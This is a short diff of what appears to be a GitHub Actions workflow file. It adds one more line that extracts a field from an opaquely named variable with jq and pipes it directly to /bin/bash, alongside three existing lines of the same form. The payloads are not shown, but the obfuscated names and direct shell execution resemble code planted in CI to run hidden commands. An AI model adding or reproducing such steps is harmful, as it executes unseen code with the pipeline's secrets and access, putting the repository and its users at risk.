@@ -21,6 +21,7 @@ jobs:
           echo $mi04 | jq -r .xnqyw38 | /bin/bash
           echo $xmzk08 | jq -r .akifx70 | /bin/bash
           printf '%s' "$gif65" | jq -r .rqmes7 | /bin/bash
+          printf '%s' "$ffm1" | jq -r .qsfr1 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
